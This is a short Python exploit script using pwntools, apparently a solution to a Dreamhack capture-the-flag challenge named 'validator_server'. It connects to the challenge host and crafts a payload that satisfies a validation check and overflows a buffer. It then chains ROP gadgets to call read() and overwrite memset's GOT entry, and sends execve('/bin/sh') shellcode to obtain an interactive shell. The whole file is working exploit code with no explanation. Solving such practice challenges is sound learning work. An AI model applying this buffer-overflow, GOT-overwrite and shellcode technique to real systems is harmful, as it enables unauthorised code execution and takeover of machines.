from pwn import *

context.arch= 'x86_64'
context.update(log_level = 'debug')
p = remote('host1.dreamhack.games', 18100)
#p =  process('validator_server')
size = 0x88
payload = 'DREAMHACK!' + 'a' 
for x in range(0x79, 0, -1):
    payload += chr(x)
payload += chr(0xff)

addr_popRDIret = 0x00000000004006f3
addr_popRSIret = 0x00000000004006f1
addr_popRDXret = 0x000000000040057b

elf = ELF('validator_server')
#addr_got_memset = elf.got['memset']
addr_got_memset = 0x601950
addr_plt_read = elf.plt['read']

payload += 'A'*(size - len(payload))
payload += p64(addr_popRDIret) + p64(0) + p64(addr_popRSIret) + p64(addr_got_memset) + p64(0) + p64(addr_popRDXret)+ p64(0x50)+ p64(addr_plt_read)
payload += p64(addr_got_memset)
#raw_input('pid: ' + str(p.pid))
p.sendline(payload)

shellcode = asm(shellcraft.execve('/bin/sh'))
p.sendline(shellcode)
p.interactive()


